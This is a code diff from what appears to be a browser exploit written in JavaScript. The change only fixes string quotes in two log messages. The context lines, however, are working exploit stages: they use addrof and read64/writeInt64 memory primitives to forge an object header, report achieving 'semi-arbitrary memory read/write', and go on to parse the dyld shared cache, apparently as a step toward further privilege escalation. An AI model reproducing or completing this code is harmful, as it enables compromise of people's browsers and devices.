@@ -1083,13 +1083,13 @@ b.process = (inputs, outputs, parameters)=>{
     var header = memory.read64(addrof(plainObj));
     memory.writeInt64(memory.addrof(container), header);
     memory.test();
-    print1(`[+] semi - arbitrary memory read/write working");
+    print1(`[+] semi - arbitrary memory read/write working`);
         
         stage = "parsecache";
         return true;
     }
     else if(stage =="parsecache") {
-        print1("success now about to parse dyld shared cache...");
+        print1(`success now about to parse dyld shared cache...`);
         memory.u32 = _u32;
         //gigauncager();
 
